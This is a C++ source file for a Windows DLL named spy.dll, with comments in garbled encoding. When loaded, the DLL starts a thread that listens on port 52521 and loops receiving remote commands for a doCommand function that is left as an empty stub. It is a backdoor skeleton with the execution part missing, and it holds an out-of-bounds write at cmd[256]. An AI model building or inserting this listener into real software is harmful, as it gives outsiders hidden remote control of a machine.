// spy.cpp : ���� DLL Ӧ�ó���ĵ���������
//

#include "stdafx.h"
#include "socket.h"
#include <Windows.h>


////////////////////////////////
//ȫ�ֱ���
///////////////////////////////
HINSTANCE	hInstance;
HANDLE hThread;

int doCommand(char *cmd)
{
	return 0;
}

DWORD WINAPI WorkThreadProc(LPVOID lpParameter)				//�����߳�
{
	//�����׽��֣��󶨱��ض˿ڣ����ȴ����ӣ�
	//׼���������ʼ����
	
	char cmd[256] = {0};

	MSocket s(52521);
	s.bind();
	s.listen();
l:	s.accept();
	//ѭ�����ա�ִ������
	while(true)
	{
		int r = s.recv(cmd, sizeof(cmd));
		if(r > 0)
		{
			cmd[256] = 0;
			doCommand(cmd);
		}
		else
		if(SOCKET_ERROR == r )
		{
			OutputDebugString("Connection was breaked,\n");
			OutputDebugString("and will continue accept...\n");
			goto l;
		}
	}

	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpvReserved)
{
	hInstance = hModule;

    switch( dwReason )
	{
    case DLL_PROCESS_ATTACH:
		OutputDebugString("The spy.dll is loading...\n");
		hThread = CreateThread(0, 0, WorkThreadProc, 0, 0, 0);//���������߳�
		if(0 == hThread)
		{
			OutputDebugString("Create work thread failue!\n");
			return false;
		}
		break;

    case DLL_PROCESS_DETACH:
        OutputDebugString("The spy.dll is unloading...\n");		// process address space
        break;

    case DLL_THREAD_ATTACH:  // A thread is being created
        break;

    case DLL_THREAD_DETACH:  // A thread is exiting cleanly
        break;

    default:
        break;
	}
	return true;
}